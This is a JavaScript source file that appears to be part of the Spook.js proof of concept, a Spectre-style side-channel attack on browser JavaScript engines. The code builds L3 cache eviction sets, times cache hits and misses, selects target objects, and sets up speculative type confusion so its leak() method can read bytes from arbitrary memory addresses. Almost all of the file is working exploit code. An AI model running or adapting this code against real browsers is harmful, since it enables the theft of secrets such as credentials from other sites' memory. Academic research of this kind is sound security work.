(function(exported){

class SpookJs {
  constructor(objects, target) {
    this.objects = objects;
    this.target  = target;
  }

  setAddress(address) {
      const upper = Number((address >> 32n) & 0xFFFFFFFFn);
      const lower = Number((address >> 0n) & 0xFFFFFFFFn);

      const {index} = this.target;

      if ((upper & 0x01) === 0x00) {
          // Bit-33 is unset
          this.objects[index].f7 = lower >> 1;
          this.objects[index].f8 = upper >> 1;
          this.objects[index].f9 = 0;
          spectreArgs[3] = (lower & 0x01);
      } else {
          // Bit-33 is set
          //  Cause overflow in f9 using index to set bit-33
          this.objects[index].f7 = lower >> 1;
          this.objects[index].f8 = upper >> 1;
          this.objects[index].f9 = 0xFFFFFFFE >> 1;
          spectreArgs[3] = (lower & 0x01) + 0x02;
      }
  }

  leak(address) {
    this.setAddress(address);
    return leakByte3(this.target.set.evictor, this.target.index);
  }

  static create(objects, options) {
    return create_spook_js(objects, options);
  }
}

async function create_spook_js(objects, options) {
    const {module, memory} = await getAccessModules();
    const buffer = new Uint32Array(memory.buffer);

    // Avoid allocate-on-write optimizations
    buffer.fill(1);
    buffer.fill(0);

    await startTimer();

    // Build eviction sets
    self.importScripts('evsets/main.js');

    let sets = await build_evset({
        offset: options.offset ?? 63,
        module: module,
        memory: memory,
    });

    sets = sets.map((set) => {
        let offsets = set.map(element => element.offset);
        offsets     = shuffle(offsets);
        offsets     = offsets.slice(0, EVICTION_SET_MAX_SIZE);

        return {
            evictor: new EvictionListL3(buffer, offsets),
            set: set,
            tag: set[0].tag,
        };
    });

    log(`Eviction set count: ${sets.length}`);
    log(`Eviction set length: ${sets[0].set.length}`);

    // Select candidate eviction set / object pairs
    const candidates = await find_candidates(
        objects,
        sets,
        buffer,
        options,
    );

    log(`Candidate count: ${candidates.length}`);

    // Check each candidate and verify we can perform type confusion
    const target = select_candidate(
        objects,
        candidates,
        options,
    );

    // Failed to create channel.
    //  Typically because our eviction set wasn't able to evict
    //  the object properly.
    if (target === null) {
        return null;
    }

    console.log(target);

    return new SpookJs(objects, target);
}

const find_candidates = preventOptimization(async function(objects, sets, buffer, options){
    // We increment f0 and f5 when trying to find our eviction set
    //  Set to zero to avoid any overflows and conversion to double
    for (let i = 64; i < 128; i++) {
      objects[i].f0 = 0;
      objects[i].f5 = 0;
    }

    const L3_HIT_THRESHOLD = 30;
    const L3_MISS_THRESHOLD = 30;

    function median(values) {
        return values.sort((a, b) => a - b)[values.length >> 1];
    }

    // Otherwise, we need to use a side channel to determine which
    //  object and set pair work.
    const candidates = [];
    const sample_count = 5;

    // Preallocate to avoid noise from allocation.
    const hit  = new Array(sample_count).fill(0);
    const hit2 = new Array(sample_count).fill(0);
    const miss = new Array(sample_count).fill(0);

    function f0(object) {
        const start = Atomics.load(buffer, 64);
        object.f0++;
        const end   = Atomics.load(buffer, 64);

        return end - start;
    }

    function f5(object) {
        const start = Atomics.load(buffer, 64);
        object.f5++;
        const end   = Atomics.load(buffer, 64);

        return end - start;
    }

    for (let i = 0; i < 10000; i++) {
        f0(objects[75 + (i % 20)]);
        f5(objects[75 + (i % 20)]);
    }

    // Some of the earlier objects may not be compacted properly
    const start = options.index ?? 70;

    // Save some time by skipping the last few objects.
    //  Typically the target object has index 70-95
    const end = options.index ?? 100;

    const display = Math.floor(sets.length / 10);
    for (let set_index = 0; set_index < sets.length; set_index++) {
        const set = sets[set_index];

        if (set_index % display === 0) {
            log(`Generating candidates ${Math.round(set_index/sets.length*100)}%`);
        }

        if (options.offset && set.evictor.offset !== options.offset) {
            continue;
        }

        for (let index = start; index <= end; index++) {
            const object = objects[index];
            const evictor = set.evictor;

            for (let sample = 0; sample < sample_count; sample++) {
                evictor.traverse();
                miss[sample] = f0(object);
                hit[sample]  = f0(object);
            }

            for (let sample = 0; sample < sample_count; sample++) {
                evictor.traverse();
                hit2[sample] = f5(object);
            }

            if (
                median(hit)  < L3_HIT_THRESHOLD &&
                //median(hit2) < L3_HIT_THRESHOLD &&
                median(miss) > L3_MISS_THRESHOLD
            ) {
                candidates.push({object, set, index});
            }
        }
    }

    return candidates;
});

function select_candidate(objects, candidates, options) {
    // Arbitrarily chosen test value, just needs to be a single byte.
    const TEST_VALUE = 0x5A;

    // Setup each of our objects for the type confusion.
    //  Set each length to a reasonable size, too long and a different
    //  branch is taken in the array indexing code that breaks the
    //  attack.
    for (let i = 64; i < 128; i++) {
      objects[i].f0 = 64;         // Refer to gadget for documentation.
      objects[i].f3 = TEST_VALUE >> 1;  // Length in bytes
      objects[i].f4 = 0 >> 1;     //  - continued
      objects[i].f5 = TEST_VALUE >> 1;  // Length in elements
      objects[i].f6 = 0 >> 1;     //  - continued
    }

    // Perform type confusion but use the 'array.length' property.
    //  This verifies that our channel works without requiring a known
    //  address with a known value.
    //
    // f5 above is set to an arbitrary value and we try to access it
    //  with `object.length`. Architecturally `object.length` accesses
    //  the length property of object, which doesn't exist, and would
    //  return undefined. Speculatively, object is interpreted as an
    //  array so some offset into the memory (where f5 happens to be)
    //  is read as the length.
    //
    for (let i = 0; i < candidates.length; i++) {
        const candidate = candidates[i];
        const {set, index} = candidate;

        const value = mode(10, () => leakByte2(set.evictor, null, index));

        log(`Checking candidate ${i + 1}/${candidates.length}`)

        if (value === TEST_VALUE) {
            if (options.verify) {
                const spook = new SpookJs(objects, candidate);
                const value = mode(100, () => spook.leak(options.verify.address));

                if (value !== options.verify.value) {
                    continue;
                }
            }

            return candidate;
        }
    }

    return null;
}

function mode(count, f) {
    const a = [];
    
    for (let i = 0; i < count; i++) {
        a.push(f());
    }
    
    a.sort((x, y) => x - y);
    
    var bestStreak = 1;
    var bestElem = a[0];
    var currentStreak = 1;
    var currentElem = a[0];
    
    for (let i = 1; i < a.length; i++) {
        if (a[i-1] !== a[i]) {
            if (currentStreak > bestStreak) {
                bestStreak = currentStreak;
                bestElem = currentElem;
            }
            
            currentStreak = 0;
            currentElem = a[i];
        }
        
        currentStreak++;
    }
    
    return currentStreak > bestStreak ? currentElem : bestElem;
}

exported.SpookJs = SpookJs;

})(typeof(window) !== 'undefined' ? window : self);